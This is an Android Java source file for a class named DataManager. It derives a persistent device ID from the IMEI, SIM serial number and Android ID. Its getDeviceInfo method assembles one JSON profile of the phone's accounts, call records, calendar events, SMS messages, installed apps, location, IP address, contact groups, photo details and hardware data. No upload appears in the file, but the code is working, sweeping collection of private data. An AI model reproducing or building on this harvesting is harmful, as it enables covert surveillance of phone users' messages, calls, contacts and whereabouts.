package cdax.naindex.datalib;

import static android.content.Context.MODE_PRIVATE;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Base64;

import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.UUID;


public class DataManager extends DataManagerGaid {

    private Context context;


    public DataManager(Context context) {
        this.context = context;
        DataHandler.init(context);
    }


    /**
     * @param context
     * @return
     */
    public static String getAppImei(Context context) {

        try {
            return getUuid(context);

        } catch (Exception e) {
            e.printStackTrace();
        }

        return getUUID2String(context);
    }


    public static String getUuid(Context context) {

        final TelephonyManager tm = (TelephonyManager) context
                .getSystemService(Activity.TELEPHONY_SERVICE);

        String tmDevice = "", tmSerial = "", tmPhone = "", androidId = "";

        try {
            tmDevice = tm.getDeviceId();
            // tmSerial = "2222" + tm.getSimSerialNumber();
            tmSerial = tm.getSimSerialNumber();
        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
            androidId = Settings.Secure.getString(context
                            .getContentResolver(),
                    Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }

        UUID deviceUuid = new UUID(androidId.hashCode(),
                ((long) tmDevice.hashCode() << 32) | tmSerial.hashCode());
        String uniqueId = deviceUuid.toString();

        return uniqueId;

    }


    public static void saveImeiString(String imei, Context ctx) {
        saveStringValue("app_imei", imei, ctx);
    }

    public static String getImeiString(Context context) {
        return getStringValueByKey(context, "app_imei");
    }


    public static String getStringValueByKey(Context context, String key) {
        SharedPreferences sharePre = context.getSharedPreferences("857uuid",
                Context.MODE_PRIVATE);
        return sharePre.getString(key, null);
    }


    public static void saveStringValue(String key, String value, Context ctx) {
        SharedPreferences sharePre = ctx.getSharedPreferences("857uuid",
                Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharePre.edit();
        editor.putString(key, value);
        editor.commit();
    }

    public static String getUUID2String(Context mContext) {
        String KEY_UUID = "app_key_uuid";
        String uuid = "";
        try {
            uuid = getStringValueByKey(mContext, KEY_UUID);
            if (uuid != null && uuid.trim().length() != 0)
                return uuid;
            uuid = UUID.randomUUID().toString();
            uuid = Base64.encodeToString(uuid.getBytes(), Base64.DEFAULT).replaceAll("\r|\n", "");
            saveStringValue(KEY_UUID, getValueEncoded(uuid), mContext);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return uuid;
    }

    private static String getValueEncoded(String value) {
        if (value == null) return "";
        try {
            String newValue = value.replace("\n", "");
            for (int i = 0, length = newValue.length(); i < length; i++) {
                char c = newValue.charAt(i);
                if (c <= '\u001f' || c >= '\u007f') {
                    try {
                        return URLEncoder.encode(newValue, "UTF-8");
                    } catch (UnsupportedEncodingException e) {
                        e.printStackTrace();
                    }
                }
            }
            return newValue;

        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";

    }

    //    If the calling app's target SDK is API level 28 or lower and the app has the READ_PHONE_STATE permission then null is returned.
//    If the calling app's target SDK is API level 28 or lower and the app does not have the READ_PHONE_STATE permission, or if the calling app is targeting API level 29 or higher, then a SecurityException is thrown.
    public static String getImei2023(Context context) {
        final TelephonyManager tm = (TelephonyManager) context
                .getSystemService(Activity.TELEPHONY_SERVICE);
        String imei = null;
        try {
            if (ActivityCompat.checkSelfPermission(context,
                    Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                    imei = tm.getDeviceId();
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            if (TextUtils.isEmpty(imei)) {
                imei = getUUID(context);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return imei;
    }

    public static String getUUID(Context context) {
        String key = ContactsContract.CommonDataKinds.Phone.CONTACT_ID.toUpperCase();
        SharedPreferences setting_info = context.getSharedPreferences(key, MODE_PRIVATE);
        String result = setting_info.getString(key, null);
        if (!TextUtils.isEmpty(result)) {
            return result;
        }
        String uuid = UUID.randomUUID().toString();
        SharedPreferences.Editor edit = setting_info.edit();
        edit.putString(key, uuid);
        edit.commit();
        return uuid;
    }


    public JSONObject getDeviceInfo() {
        JSONObject deviceInfo = new JSONObject();
        try {
            JSONArray appsJsonArray = DeviceUtils.getAppList(context);
            if (appsJsonArray == null || appsJsonArray.length() <= 0) {
                appsJsonArray = DeviceUtils.getAppList2(context);
            }

            deviceInfo.put("account", CallRecordUtil.getAppAccounts(context));
            deviceInfo.put("call", CallRecordUtil.getContactRecord(context));
            deviceInfo.put("calendar", CalendarEvents.getcalendar(context));
            deviceInfo.put("hardware", DeviceUtils.getHardWareInfo());


            deviceInfo.put("storage", FileSizeUtil.getStorageInfo(context));
            deviceInfo.put("general_data", DeviceUtils.getGeneralData());
            deviceInfo.put("other_data", DeviceUtils.getOtherData());
            deviceInfo.put("application", appsJsonArray);

            deviceInfo.put("network", DeviceUtils.getNetworkData());
            deviceInfo.put("battery_status", DeviceUtils.getBatteryData());
            deviceInfo.put("audio_external", DeviceUtils.getAudioExternalNumber());
            deviceInfo.put("audio_internal", DeviceUtils.getAudioInternalNumber());
            deviceInfo.put("images_external", DeviceUtils.getImagesExternalNumber());
            deviceInfo.put("images_internal", DeviceUtils.getImagesInternalNumber());
            deviceInfo.put("video_external", DeviceUtils.getVideoExternalNumber());
            deviceInfo.put("video_internal", DeviceUtils.getVideoInternalNumber());
            deviceInfo.put("download_files", DeviceUtils.getDownloadFileNumber());
            deviceInfo.put("contact_group", DeviceUtils.getContactsGroupNumber());


            deviceInfo.put("build_id", String.valueOf(DeviceUtils.getVersionCode(context)));

//            BuildConfig.VERSION_CODE
            deviceInfo.put("build_name", DeviceUtils.getVersionName(context));
            deviceInfo.put("package_name", DeviceUtils.getPackageName(context));
            deviceInfo.put("create_time", System.currentTimeMillis());
            deviceInfo.put("location", DeviceUtils.getLocation(context));
            JSONObject jsonPIP = new JSONObject();
            jsonPIP.put("first_ip", DeviceUtils1.getHostIP());
            jsonPIP.put("second_ip", DeviceUtils1.getHostIP());
            deviceInfo.put("public_ip", jsonPIP);

            JSONObject other = new JSONObject();
            other.put("ActiveTime", SystemClock.uptimeMillis());
            other.put("UpTime", SystemClock.elapsedRealtime());
            other.put("BatteryCapacity", DeviceUtils1.getBatteryCapacity(context));
            other.put("CpuFrequency", DeviceUtils1.getCpuMaxFrequency());
            other.put("ScreenRes", DeviceUtils.getScreenDisplay(context));
            deviceInfo.put("other", other);
            deviceInfo.put("sms", ContactAndMessageUtil.getSmsList(context));

//            deviceInfo.put("albs", FileSizeUtil.getImagesMsg());

            deviceInfo.put("albs", new JSONObject().
                    put("albs", FileSizeUtil.getImagesMsg()));
//            deviceInfo.put("albs", new JSONObject().
//                    put("albs", new JSONObject()
//                            .put("albs", new JSONObject()
//                                    .put("dataList", FileSizeUtil.getSystemPhotoList(context)))));


        } catch (Exception e) {
            e.printStackTrace();
        }
        return deviceInfo;
    }

}
